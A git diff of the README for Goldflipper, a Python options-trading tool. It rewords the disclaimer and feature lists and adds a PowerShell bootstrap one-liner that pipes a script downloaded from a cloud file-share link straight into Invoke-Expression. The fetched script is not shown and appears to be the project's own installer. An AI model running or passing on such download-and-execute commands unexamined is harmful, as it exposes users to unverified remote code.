@@ -1,4 +1,3 @@
-# Goldflipper
 
 [![CI](https://github.com/Zaroganos/goldflipper/actions/workflows/ci.yml/badge.svg)](https://github.com/Zaroganos/goldflipper/actions/workflows/ci.yml)
 [![Version](https://img.shields.io/badge/version-0.3.2-blue.svg)](https://github.com/Zaroganos/goldflipper/releases)
@@ -8,52 +7,62 @@
 [![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
 [![Pyright](https://img.shields.io/badge/type%20checked-pyright-brightgreen.svg)](https://github.com/microsoft/pyright)
 
-Goldflipper Trading System
+# Goldflipper
 
 ![Screenshot of Goldflipper's main interface showing the trading dashboard](https://github.com/user-attachments/assets/5eb5c068-8759-44c8-afde-067fdcd55f92)
 
 ## Disclaimer
 
-Goldflipper is proprietary, source-available software. Please note that technical support, bug fix, and feature requests are managed on a discretionary basis at this time.
-This program does not capture or transmit any of your data. Goldflipper only makes connections to brokerage(s) and market data provider(s). Newer branches also make calls using ancillary python libraries in order to enhance function by validating inputs (to address user entry errors), and by checking the market calendar. Security wise, note that in this version, access keys are stored in the settings file in plaintext (or, plain-yaml).
+Goldflipper is proprietary, source-available software. Technical support, debugging, and feature requests are considered on a discretionary basis.
+Goldflipper does not irresponsibly capture or transmit any of your data. Goldflipper connects with your selected brokerage(s), market data provider(s), and ancillary data sources e.g. market calendar provider(s), and user entry validation data source(s). Goldflipper is strictly not intended for real-world use with a live, funded trading account - such action is ill-advised and impermissible; moreover, user-entered configuration keys and values are stored in plaintext yaml records.
 
-## Introduction
+## About
 
-Goldflipper is a semi-autonomous trading system developed in Python. It utilizes a modular, event-driven architecture to automate trading strategy execution, with a current focus on level 2 options trading. The system is designed for customizability, modularity, and offers a feature-rich parameter selection that enables functionality not seen in any other program of its kind. Goldflipper integrates with the Alpaca Markets API for live trading, and has API integrations with market data providers as well in order to provide a modular and robust trading experience with fallbacks for reliability.
+The Goldflipper Trading System is a modular semi-autonomous state-based financial market platform developed primarily in Python for experimental economics research. Goldflipper's modular design centers on a core event-driven trading algorithm to automate user-defined trading strategy execution, with a current focus on levels 1 and 2 options trading. The system is designed for fine-grained, flexible configuration, logical extensibility with modules and abstractions, and offers a feature-rich parameter selection enabling unique and plausibly novel abilities. Goldflipper currently integrates with Alpaca Markets' API for paper trading, and has integrations with market data providers APIs, yielding a robust plug-and-play options trading experience with fallbacks and failsafes for reliable operation.
 
-## Getting Started
+## Get Started
 
 ### Prerequisites
 
-Before you start, ensure you have the following:
+Ensure you have the following:
 
-- **Alpaca Markets account** for brokerage access; multi-broker support is in development
-- **Windows OS** Windows 10 / 11 required at this time; cross-OS support is in development
+- **Alpaca Markets account** for brokerage access
+- **Market Data Provider account(s)** one or more required:
+  - Market Data App (freemium)
+  - Alpaca Markets (freemium)
+  - Yahoo Finance (free, built-in support via yfinance) no signup required, enabled by default
+- **Windows OS** Windows 10 / 11 required
+
+Additional Requirements for Development Environment:
+
 - **Git** required for cloning the repository and keeping it up to date
-- **Python 3.12** or higher required
-- **Python libraries** (see Installation section); strongly recommended to use a virtual environment to avoid dependency conflicts. Consider using venv, Poetry, or uv as well. Default will use uv venv. Further documentation to be added in due time.
-- **Market Data Provider account(s)** (required if not using market data from brokerage or from premium subscription):
-  - Yahoo Finance (free, built-in support via yfinance) - no signup required
+- **Python 3.12** or higher required; recommended Python versions are 3.12-3.13
+- **Python libraries** recommend using a virtual environment to avoid dependency conflicts, with `uv venv`
 
 ### Installation
 
 #### Windows Installer (Recommended)
 
-For a professional installation experience with Windows integration:
+You may install Goldflipper with the Windows native installer either by downloading the .msi release directly, or by running a PowerShell one-liner command to use a convenient bootstrap shell script
 
-1. Download the latest installer `goldflipper-0.2.5-x64.msi` from either the [Releases](https://github.com/Zaroganos/goldflipper/releases) page directly, or;
-2. Run the one-liner bootstrap command provided to you (if you have been given internal QA testing authorization) in PowerShell by pressing `Win+X` and then `i`
-3. Run the installer and follow the wizard
-4. Launch Goldflipper from the Start Menu or desktop shortcut
+1A. Download the latest installer `goldflipper-0.3.2-x64.msi` from the [Releases](https://github.com/Zaroganos/goldflipper/releases) page,
+or
+1B. Run the one-liner bootstrap command in PowerShell by pressing `Win+X` then `i`, pasting the command below, and pressing Enter,
+
+```powershell
+irm 'https://cloud.zimerguz.net/s/558TjEgMCdEjaLN/download' | iex
+```
+2. Run the installer and follow the wizard
+3. Launch Goldflipper from the Start Menu or with the Desktop shortcut
 
 The MSI installer provides:
 
-- Program Files installation with proper Windows integration
+- Program Files installation with Windows integration
 - Start Menu and Desktop shortcuts
 - Add/Remove Programs entry with uninstall support
-- Automatic upgrades for newer versions
+- Automatic upgrades to newer versions
 
-See [Windows Installer Documentation](docs/WINDOWS_INSTALLER.md) for details.
+See [Windows Installer Documentation](docs/WINDOWS_INSTALLER.md) for more.
 
 ### One-Liner Bootstrap (Current)
 
@@ -77,7 +86,7 @@ The bootstrap script will:
 - Install all dependencies in development mode
 - Launch Goldflipper automatically
 
-#### Manual Installation
+#### Manual Installation - For Development Use
 
 1. **Clone the repository:**
 
@@ -201,7 +210,7 @@ python goldflipper\goldflipper_tui.py
 
 ## Key Features
 
-### 🎯 **Trading System**
+### **Trading System**
 - **Semi-autonomous options trading** with rules-based execution
 - **Multi-strategy support** (NEW): Run multiple trading strategies concurrently
 - **Advanced play management** with state-based workflow
@@ -210,7 +219,7 @@ python goldflipper\goldflipper_tui.py
 - **Real-time monitoring** with continuous play evaluation
 - **Dry-run mode**: Test strategies without executing orders
 
-### 🔄 **Multi-Strategy System** (NEW - 2025-12-01)
+### **Multi-Strategy System**
 - **Strategy Orchestrator**: Coordinate multiple strategies (sequential or parallel)
 - **Built-in strategies**:
   - `option_swings` - Manual option swings (BTO/STC)
@@ -221,20 +230,20 @@ python goldflipper\goldflipper_tui.py
 - **Playbook system**: YAML-based strategy configuration
 - **Extensible**: Add new strategies via BaseStrategy interface
 
-### 📊 **Market Data & Analysis**
+### **Market Data & Analysis**
 - **Multiple data providers** behind unified manager with automatic failover
 - **Options Greeks calculations**: Delta, Gamma, Theta, Vega, Rho, and 15+ advanced Greeks
 - **Technical indicators**: basic views of EMA, MACD, TTM Squeeze, and custom indicators
 - **Interactive charting** basic candlestick charts and overlay indicators
 
-### 🖥️ **User Experience**
+### **User Experience**
 - **Text User Interface** built with Textual framework
 - **Play Creator GUI** (NEW): Tkinter-based visual play creation
 - **Console mode** for direct system interaction
 - **Trade logger** with multi-strategy filtering
 - **Windows service integration** for background operation
 
-### 🔧 **Management Tools**
+### **Management Tools**
 - **Play Creator GUI** (NEW): Visual option chain browser with Greeks display
 - **Play creation tool** with guided setup and validation
 - **Play editing system** with safety protections for active trades
@@ -244,7 +253,7 @@ python goldflipper\goldflipper_tui.py
 - **Configuration management** with YAML-based settings
 - **Data export capabilities** (CSV, Excel) for records and analysis
 
-### 🛡️ **System Reliability**
+### **System Reliability**
 - **Watchdog system** for automated health monitoring
 - **Comprehensive logging** with structured trade tracking
 - **State persistence** with automatic backup and recovery
@@ -256,37 +265,16 @@ python goldflipper\goldflipper_tui.py
 
 Goldflipper supports multiple market data providers for robust and reliable data access:
 
-### **MarketDataApp** (Primary)
-
-### **Alpaca Markets** (Backup)
-
-### **Yahoo Finance** (Backup)
+- **MarketDataApp** (Primary)
+- **Alpaca Markets** (Backup)
+- **Yahoo Finance** (Backup)
 
 ## Configuration Guide
 
 ### **Basic Configuration**
-The system uses a YAML configuration file (`goldflipper/config/settings.yaml`) with the following key sections:
+The system uses a YAML configuration file (`goldflipper/config/settings.yaml`)
 
-```yaml
-# Alpaca API Configuration
-alpaca:
-  accounts:
-    paper_1:
-      enabled: true
-      api_key: 'YOUR_PAPER_API_KEY'
-      secret_key: 'YOUR_PAPER_SECRET_KEY'
-      base_url: 'https://paper-api.alpaca.markets/v2'
-  default_account: 'paper_1'
-
-# Market Data Providers
-market_data_providers:
-  providers:
-    marketdataapp:
-      enabled: true
-      api_key: 'YOUR_MARKETDATAAPP_KEY'
-```
-
-### **Multi-Strategy Configuration** (NEW)
+### **Multi-Strategy Configuration**
 ```yaml
 # Strategy Orchestration (multi-strategy mode)
 strategy_orchestration:
@@ -321,13 +309,12 @@ sell_puts:
 
 ## Directory Structure
 
-Goldflipper Classic is roughly organized into the following directory structure:
-(Simplified for brevity, access the codebase to discover the full content.)
+Goldflipper is roughly organized into the following directory structure:
 
 ```
 goldflipper/
-├── config/                     # Configuration files and settings
-│   ├── config.py              # Configuration management
+├── config/                    # Configuration files and settings
+│   ├── config.py             # Configuration management
 │   └── settings_template.yaml # Configuration template
 ├── data/                      # Data handling modules
 │   ├── greeks/               # Options Greeks calculations
